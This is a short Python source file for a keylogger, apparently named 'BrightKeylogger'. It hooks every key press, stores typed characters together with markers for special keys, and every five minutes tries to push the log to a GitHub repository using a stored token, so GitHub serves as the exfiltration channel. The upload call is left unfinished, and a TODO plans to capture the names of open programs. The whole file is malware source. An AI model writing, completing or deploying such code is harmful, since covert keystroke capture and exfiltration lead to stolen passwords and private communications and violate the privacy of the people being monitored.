import keyboard
import time
import threading
import github3

def connect_github():
    with open('mytoken.txt') as f:
        token = f.readline()
    user = 'Kirubel1422'
    sess = github3.login(token=token)
    return sess.repository(user, 'BrightKeylogger')

class KeyLogger:
    def __init__(self):
        self.keystroke = None
        self.ascii = 0
        self.text_content = ""
        self.repo = connect_github()

    def onkeystroke(self, event):
        self.keystroke = event.name

        if len(repr(event.name)) != 3:
            self.ascii = 0
        else:
            self.ascii = ord(event.name)

        if 33 <= self.ascii <= 126:
            self.text_content += event.name
        else:   
            self.text_content += f'\nHOT: {event.name}\n' 

    def start_logger(self):
        keyboard.on_press(self.onkeystroke)
        keyboard.wait()

    def run(self):
        t = threading.Thread(target=self.start_logger)
        t.start()
        return t

def run(**args):
    kl = KeyLogger()
    """
    TODO: ADD A WAY TO PRINT THE OPENED SOFTWARE NAME
    """
    t = kl.run()

    while True:
        time.sleep(5 * 60)
        kl.repo.create_file()
    

if __name__ == "__main__":
    print(run())